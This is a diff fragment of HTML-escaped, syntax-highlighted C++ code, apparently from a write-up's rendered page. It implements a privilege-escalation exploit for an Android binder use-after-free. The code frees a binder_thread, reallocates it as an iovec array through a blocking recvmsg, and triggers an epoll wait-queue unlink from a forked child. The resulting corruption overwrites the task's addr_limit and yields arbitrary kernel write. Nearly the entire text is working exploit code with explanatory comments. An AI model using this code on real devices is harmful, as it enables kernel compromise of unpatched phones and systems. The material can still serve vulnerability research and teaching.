+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">msghdr&lt;/span> &lt;span class="n">message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_COUNT&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Get binder fd
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">setupBinder&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Create event poll
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">setupEventPoll&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Setting up socket&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">socketpair&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">AF_UNIX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SOCK_STREAM&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sock_fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] Unable to create socketpair&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Socketpair created successfully&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// We will just write junk data to socket so that when recvmsg
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// is called it process the fist valid iovec with this junk data
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// and then blocks and waits for the rest of the data to be received
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">static&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x41&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Writing junk data to socket&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sock_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesWritten&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Write junk data to the socket so that when recvmsg is
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// called, it process the first valid iovec with this junk
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// data and then blocks for the rest of the incoming socket data
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Setting up iovecs&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// We want to block after processing the iovec at IOVEC_WQ_INDEX,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// because then, we can trigger the unlink operation and get the
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// next iovecs corrupted to gain scoped write.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">mmap4gbAlignedPage&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m_4gb_aligned_page&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x42424242&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Prepare the data buffer that will be written to socket
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// will result in crash because of a check in do_page_fault
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// However, x86_64 does not have this check. But it&amp;#39;s better
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// to set it to 0xFFFFFFFFFFFFFFFE so that this same code can
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// be used in arm64 as well.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">static&lt;/span> &lt;span class="kt">uint64_t&lt;/span> &lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX].iov_len
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint64_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">OFFSET_TASK_STRUCT_ADDR_LIMIT&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0xFFFFFFFFFFFFFFFE&lt;/span> &lt;span class="c1">// addr_limit value
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Prepare the message
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">msg_iov&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">msg_iovlen&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">IOVEC_COUNT&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Now link the poll wait queue to binder thread wait queue
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">linkEventPollWaitQueueToBinderThreadWaitQueue&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// We should trigger the unlink operation when we
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// have the binder_thread reallocated as iovec array
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Now fork
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">pid_t&lt;/span> &lt;span class="n">childPid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fork&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">childPid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// child process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// There is a race window between the unlink and blocking
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// in writev, so sleep for a while to ensure that we are
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// blocking in writev before the unlink happens
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Trigger the unlink operation on the reallocated chunk
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">unlinkEventPollWaitQueueFromBinderThreadWaitQueue&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Write rest of the data to the socket so that recvmsg starts
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// processing the corrupted iovecs and we get scoped write and
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// finally arbitrary write
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sock_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesWritten&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// parent process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// I have seen some races which hinders the reallocation.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// So, now freeing the binder_thread after fork.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">freeBinderThread&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Reallocate binder_thread as iovec array and
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// we need to make sure this recvmsg call blocks.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// recvmsg will block after processing a valid iovec at
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nBytesReceived&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">recvmsg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sock_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MSG_WAITALL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// If the corruption was successful, the total bytes received
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// should be equal to length of all iovec. This is because there
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// are three valid iovec
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">expectedBytesReceived&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">+&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">+&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesReceived&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">expectedBytesReceived&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesReceived&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">expectedBytesReceived&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Wait for the child process to exit
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">wait&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">);&lt;/span>
